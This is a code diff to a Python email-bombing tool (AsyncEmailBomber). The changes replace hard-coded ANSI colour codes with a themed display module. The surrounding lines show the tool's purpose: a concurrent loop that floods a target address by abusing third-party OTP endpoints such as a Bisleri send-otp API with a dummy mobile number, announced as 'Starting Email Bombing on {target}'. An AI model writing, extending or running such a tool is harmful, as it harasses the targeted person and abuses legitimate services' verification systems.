@@ -16,8 +16,7 @@ import json
 import logging
 from datetime import datetime
 from urllib.parse import urlparse
-
-R, G, Y, B, P, C, W = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m', '\033[1;36m', '\033[1;37m'
+from core.display import Colorate, Theme
 
 def generate_dynamic_ua():
     platforms = ['Windows', 'Android', 'iOS']
@@ -45,6 +44,7 @@ class AsyncEmailBomber:
         self.running = False
         self.semaphore = asyncio.Semaphore(concurrency)
         self.session = None
+        self.cl = Theme.get_colors()
 
         self.apis = [
             ("Bisleri OTP", "https://apis.bisleri.com/send-otp", "POST", "json", {"email": "{target}", "mobile": "9999999999"}),
@@ -165,7 +165,7 @@ class AsyncEmailBomber:
 
                 if success:
                     self.sent += 1
-                    print(f"  {G}[+] Sent via {name}{W}")
+                    print(f"  {Colorate.Horizontal(self.cl['num'], '[+]')} {Colorate.Horizontal(self.cl['txt'], f'Sent via {name}')}")
                 else:
                     self.failed += 1
             except:
@@ -191,11 +191,13 @@ def run_bomber(target, count):
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     bomber = AsyncEmailBomber(target, limit=count)
+    cl = Theme.get_colors()
     try:
-        print(f"\n  {Y}[*] Starting Email Bombing on {target}...{W}")
+        print(f"\n  {Colorate.Horizontal(cl['num'], '[*]')} {Colorate.Horizontal(cl['txt'], f'Starting Email Bombing on {target}...')}")
         loop.run_until_complete(bomber.start())
     except KeyboardInterrupt:
         bomber.running = False
     finally:
-        print(f"\n  {G}[✓] Done. Sent: {bomber.sent} | Failed: {bomber.failed}{W}")
+        cl = Theme.get_colors()
+        print(f"\n  {Colorate.Horizontal(cl['num'], '[✓]')} {Colorate.Horizontal(cl['txt'], f'Done. Sent: {bomber.sent} | Failed: {bomber.failed}')}")
         loop.close()
